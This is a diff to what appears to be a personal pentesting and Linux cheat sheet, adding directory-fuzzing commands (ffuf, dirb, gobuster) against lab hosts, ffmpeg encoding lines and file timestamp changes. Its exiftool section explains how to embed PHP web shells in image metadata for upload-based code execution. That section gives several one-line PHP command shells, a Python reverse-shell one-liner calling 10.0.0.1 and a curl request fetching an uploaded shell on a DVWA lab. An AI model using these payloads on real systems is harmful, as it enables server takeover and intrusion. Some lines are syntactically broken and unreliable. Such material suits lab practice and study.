@@ -160,6 +160,19 @@ wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --
 ```
 
 
+## ffuf
+
+    ffuf -c -w directory-list-2.3-medium.txt -u http://192.168.110.48/FUZZ  -t 100
+    ffuf -c -w directory-list-2.3-medium.txt -u http://10.10.10.10/FUZZ -e php,html -or -of md -o results.md
+    ffuf -w dirsearch/directory-list-2.3-medium.txt -X POST -d "url=dev/FUZZ.xml" -u http://10.10.10.123/upload.php -H "Cookie: PHPSESSID=j1nanul898l0fbr8bt2vgb548a" -H "Host: vuln.host.com" -H "Referer: http://backup.forwardslash.htb/profilepicture.php" -H "Content-Type: application/x-www-form-urlencoded" -fw 111 -t 300
+
+
+        -b : Cookie data `"NAME1=VALUE1; NAME2=VALUE2"`
+        -c : Colorize output
+        -w : Wordlist file path
+        -u : Target URL
+        -d : POST data
+
 
 	wfuzz  -c -z file,directory-list-2.3-medium.txt --sc 200 http://192.168.56.5/FUZZ/
 	wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 http://website.com/secret.php?FUZZ=something
@@ -168,11 +181,14 @@ wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --
 # dirb
 
 	dirb http://192.168.53.128 -X .php,.txt
+	dirb  http://192.168.110.8/secret/ -u username:password -X .php
 
 
 # gobuster
 
 	gobuster dir -u http://192.168.110.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt
+	gobuster dir -u http://192.168.110.8/secret/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --username username --password  password -x php,txt
+
 
 
 # iptables
@@ -463,3 +479,53 @@ wodim -v speed=4 -eject image.iso
 wodim -v -eject speed=4 -pad -audio *.wav
 ```
 
+
+# ffmpeg
+
+ffmpeg -i input.mp4 -vcodec libx265 -crf 18 -tag:v hvc1 -preset veryslow -an output.mp4
+ffmpeg -i big_buck_bunny.y4m -vcodec libx265 -crf 28 fps-fps=30 big_buck_bunny.mp4
+
+ffmpeg -i MVI_6150.MOV -vcodec libx265 -crf 18 -tag:v hvc1 -preset medium -an MVI_6150.mp4
+ffmpeg -i MVI_6151.MOV -vcodec libx265 -crf 28 -tag:v hvc1 -preset medium -an MVI_6151.mp4
+
+
+#exiftool
+#On kali$ apt-get install exiftool
+#Change image filename to include .php before image extension: image.php.jpeg (works with png etc etc)
+#Upload, execute image location adding ?cmd=command-here example: www.site.com/image.php.jpeg?cmd=ls
+#To acheive terminal shell, execute rev shell python from pentest monkey etc etc.
+#python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+exiftool -DocumentName="<h1>F1uffyGoat<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" image.jpeg
+
+
+or 
+
+<?php $cmd = $_GET['cmd']; echo system ($cmd);?>
+
+or
+
+<?php system($_GET['cmd']); ?>
+
+exiftool -Commment "<?php passthru(\$_GET'cmd')," _halt_compiler();" picture.jpeg
+
+
+	curl 'http://oscp.local/dvwa/hackable/uploads/img.php.jpg' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Cookie: security=high; PHPSESSID=79bg68np1331quqq5u6d5mctch' -H 'Upgrade-Insecure-Requests: 1' -H 'If-Modified-Since: Tue, 18 Jan 2022 18:23:25 GMT' -H 'If-None-Match: "263d-5d5df5d69aa4a"' -H 'Cache-Control: max-age=0'
+
+
+
+# touch
+
+```bash
+stat tgs.txt
+```
+	
+
+Setting Access and Modification
+```bash
+touch -d "2012-10-19 12:12:12.000000000 +0530" tgs.txt
+```
+update the time-stamp of file a.txt with the time-stamp of tgs.txt file
+```bash
+touch a.txt -r tgs.txt
+```
